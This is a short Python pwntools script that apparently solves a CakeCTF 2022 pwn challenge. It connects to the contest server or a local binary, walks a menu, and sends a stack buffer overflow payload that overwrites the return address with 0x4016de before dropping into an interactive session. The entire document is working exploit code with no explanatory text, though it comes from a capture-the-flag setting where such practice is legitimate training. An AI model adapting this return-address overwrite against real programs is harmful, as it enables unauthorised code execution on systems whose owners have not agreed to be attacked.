from pwn import *
import timeout_decorator
elf_file = FILENAME = 'chall'
elf = context.binary = ELF(elf_file)
context.log_level = 'debug' # output verbose log


HOST = 'pwn1.2022.cakectf.com'
POST = 9003
#libc = ELF("./libc.so.6")
'''
HOST = 'localhost'
POST = 7777
#libc = ELF("./libc.so.6")
#libc = ELF("./libc6-amd64_2.27-3ubuntu1_i386/data/lib64/libc.so.6")
'''

buf  = 0x28
payload = '\x00'*buf
payload += p64(0x4016de)

payload2 = '\x00'*(0x20)
for _ in range(1):
    try:
        if len(sys.argv) > 1 and sys.argv[1] == 'r':
            c = remote(HOST, POST)
        else:
            c = process(FILENAME)


        c.sendlineafter('choice: ','3')
        c.sendlineafter('str:',payload2)
        c.sendlineafter('choice: ','1')
        c.sendlineafter('str:',payload)
        c.interactive()
    except EOFError:
        next